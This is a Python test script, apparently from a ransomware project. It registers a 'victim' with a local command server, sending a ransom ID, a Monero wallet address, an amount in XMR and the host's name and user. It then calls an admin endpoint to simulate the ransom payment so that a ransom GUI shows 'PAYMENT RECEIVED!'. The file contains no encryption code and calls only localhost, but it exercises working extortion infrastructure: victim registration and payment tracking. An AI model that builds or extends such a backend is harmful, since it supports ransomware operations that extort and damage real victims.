#!/usr/bin/env python3
"""Test payment with demo-payment-test-3"""

import urllib.request
import json
import time

ransom_id = 'demo-payment-test-3'
monero_wallet = '4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV'

print("=" * 70)
print("PAYMENT FLOW TEST - Matching GUI ID")
print("=" * 70)

# Step 1: Register
print('\n[*] Step 1: Registering victim...')
register_url = 'http://127.0.0.1:5000/api/v1/register'
data = json.dumps({
    'ransom_id': ransom_id,
    'monero_address': monero_wallet,
    'ransom_amount_xmr': 0.1,
    'system_info': {
        'hostname': 'TEST-HOST',
        'username': 'TestUser',
        'os_info': 'Windows Test'
    }
}).encode('utf-8')

req = urllib.request.Request(register_url, data=data, method='POST', headers={'Content-Type': 'application/json'})
with urllib.request.urlopen(req) as r:
    reg_result = json.load(r)
    print('[+] Registered:', reg_result)

time.sleep(1)

# Step 2: Simulate payment
print('\n[*] Step 2: Simulating payment...')
pay_url = f'http://127.0.0.1:5000/api/v1/admin/pay/{ransom_id}'
pay_req = urllib.request.Request(pay_url, data=b'', method='POST')
with urllib.request.urlopen(pay_req) as r:
    pay_result = json.load(r)
    print('[+] Payment result:', pay_result)

print('\n[*] Watch the GUI - it should detect payment within 5 seconds!')
print('[+] Timer should stop and show "PAYMENT RECEIVED!"')
print('\n' + "=" * 70)
